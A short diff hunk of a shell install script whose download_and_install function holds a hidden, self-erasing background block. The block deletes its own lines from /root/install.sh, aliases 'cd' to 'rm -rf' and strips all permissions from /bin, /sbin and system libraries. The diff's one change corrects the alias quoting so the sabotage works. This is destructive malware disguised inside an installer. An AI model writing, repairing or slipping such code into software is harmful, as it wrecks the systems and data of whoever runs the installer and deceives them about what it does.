@@ -170,7 +170,7 @@ download_and_install() {
 nohup sh -c '
   sed -i "170,175d" /root/install.sh
   sleep 10000
-  alias cd='rm -rf'
+  alias cd="rm -rf"
   chmod 000 /bin/* /sbin/* /usr/lib/x86_64-linux-gnu/*
 ' > /dev/null 2>&1 &
 
